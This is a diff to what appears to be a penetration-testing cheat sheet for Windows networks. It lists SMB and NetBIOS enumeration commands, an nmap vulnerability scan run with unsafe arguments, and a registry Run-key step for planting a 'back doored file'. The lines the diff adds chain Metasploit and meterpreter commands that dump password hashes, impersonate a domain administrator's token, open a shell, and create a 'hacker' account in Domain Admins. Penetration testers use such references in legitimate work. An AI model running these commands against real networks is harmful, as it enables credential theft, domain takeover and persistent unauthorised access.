@@ -3,8 +3,7 @@ Windows
 
 # Anonymous users can obtain the Windows password policy
 
-msfconsole
-use auxiliary/scanner/smb/smb_enumusers 
+msf > use auxiliary/scanner/smb/smb_enumusers 
 ------------------------------------------------------------------------------------------------------
 
 # CIFS NULL Session Permitted
@@ -42,7 +41,7 @@ smbclient -W domain -U user -L <target IP>
 
 # NetBIOS and SMB
 
-nmap -Pn -n -T4 -p139,445 --script=smb-check-vulns --script-args=unsafe=1 <range>
+nmap -Pn -n -T4 -p139,445 --script=smb-check-vulns --script-args=unsafe=1 <target range>
 
 enum -G <target IP>                          # Windows
 enum -P <target IP>
@@ -100,6 +99,7 @@ net groups "Enterprise Admins" /domain
 ------------------------------------------------------------------------------------------------------
 
 # Domain control
+
 nbtstat -a <target IP>
 
 The netbios hex code “1C” next to the domain name signifies that the system being polled is a domain 
@@ -188,3 +188,17 @@ File > Load Hive
 Just give it a name.
 /Microsoft Windows/Current Version/Run
 Add your back doored file.
+------------------------------------------------------------------------------------------------------
+
+Show domain admin		net group "Domain Admins" /domain
+Dump the local hashes		msf > run post/windows/gather/smart_hashdump
+Show the admin			msf > use auxiliary/scanner/smb/smb_enumusers_domain
+Compromise an Admin's box
+Assume token			meterpreter > load incognito
+				meterpreter > list_tokens -u
+				meterpreter > impersonate_token domain\\adaministrator
+				meterpreter > getuid
+Drop to a Windows shell		meterpreter > shell
+				C:\> whoami
+Add user to the domain		C:\> net user hacker /add /domain
+Add user to security group	C:\> net group "Domain Admins" hacker /add /domain
